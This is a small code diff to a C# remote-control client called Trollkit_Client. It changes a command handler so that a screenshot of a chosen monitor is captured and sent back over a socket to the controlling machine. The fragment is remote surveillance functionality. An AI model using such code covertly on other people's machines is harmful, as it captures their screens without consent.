@@ -25,7 +25,6 @@ namespace Trollkit_Client.Modules.CommandHandlers
 		[DllImport("user32.dll")]
 		public static extern IntPtr SendMessageW(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);
 
-
 		public override bool HandleCommand(Socket s, TransferCommandObject obj)
 		{
 			switch (obj.Command)
@@ -51,7 +50,7 @@ namespace Trollkit_Client.Modules.CommandHandlers
 		{
 			try
 			{
-				string imageString = Screenshot.MakeScreenshot(); //currently primary monitor
+				string imageString = Screenshot.MakeScreenshot(monitorNumber); 
 				TransferCommandObject pfTransferObject = new TransferCommandObject { Command = "ScreenshotResponse", Value = imageString };
 				SendResponseObjectToSocket(s, ClientServerPipeline.BufferSerialize(pfTransferObject));
 				return true;
